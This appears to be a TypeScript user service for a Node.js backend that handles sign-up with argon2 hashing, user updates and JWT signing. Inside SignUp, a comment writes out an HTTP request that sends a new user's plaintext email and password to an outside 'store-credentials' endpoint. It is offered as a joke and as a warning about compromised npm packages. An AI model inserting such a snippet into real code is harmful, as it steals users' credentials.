import { UserRepository } from './../repository/userRepository';
import { Service, Inject,  } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUser } from '../interfaces/IUser';
import { UserInputDTO } from '../dto/UserInputDTO';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import { UserDTO } from '../dto/UserDTO';

@Service()
export default class UserService {
  constructor(
      private userRepository: UserRepository,
      private mailer: MailerService,
      @Inject('logger') private logger,
      @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {}

  public async FindById (id: any){
    try{
      const userRecord = await this.userRepository.findById(id);

      return userRecord;
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async Update(userDTO: UserDTO): Promise<{ user: IUser; token: string }> {
    try {
      this.logger.silly('Creating user db record');
      const userRecord = await this.userRepository.update(userDTO);

      if (!userRecord) {
        throw new Error('User cannot be update');
      }

      const user = userRecord.toObject();

      return user;
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignUp(userInputDTO: UserInputDTO): Promise<{ user: IUser; token: string }> {
    try {
      const salt = randomBytes(32);

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      this.logger.silly('Creating user db record');
      const userExist = await this.userRepository.findByEmail(userInputDTO.email);
      if (userExist) {
        throw new ReferenceError('Invalid Email');
      }
      const userRecord = await this.userRepository.createUser(userInputDTO, salt, hashedPassword);
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      if (!userRecord) {
        throw new Error('User cannot be created');
      }
      this.logger.silly('Sending welcome email');
      await this.mailer.SendWelcomeEmail(userRecord);

      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const user = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return { user, token };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  private generateToken(user: any) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);
    return jwt.sign(
      {
        _id: user._id, // We are gonna use this in the middleware 'isAuth'
        role: user.role,
        name: user.name,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }

}
